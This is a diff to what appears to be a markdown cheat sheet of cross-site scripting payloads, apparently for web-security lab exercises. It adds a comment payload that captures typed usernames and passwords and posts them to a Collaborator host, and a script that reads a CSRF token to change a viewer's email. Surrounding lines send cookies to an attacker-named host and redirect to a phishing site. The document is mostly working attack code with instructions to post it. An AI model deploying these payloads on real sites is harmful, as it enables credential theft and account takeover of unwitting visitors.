@@ -39,6 +39,7 @@ navigator.sendBeacon('https://attacker-site.com/steal-cookies', 'cookie=' + enco
 
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 ```
+--------------------------------------------
 #### post this in the comment section - it will send all cookies for all viewers this comment:
 ```
 <script>
@@ -51,7 +52,34 @@ body:document.cookie
 ### XSS redirect to another site options:
 ```
 --------------------------------------------
-
+#### post this payload in the blog comment section - 
+script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server:
+```
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+--------------------------------------------
+#### Submit the following payload in the comment section
+This will make anyone who views the comment issue a POST request to change their email address to test@test.com:
+```
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+```
+--------------------------------------------
 ### XSS to redirect or view another site on the target site:
 ```
 <script>window.location.href = "https://phishing-site.com";</script>
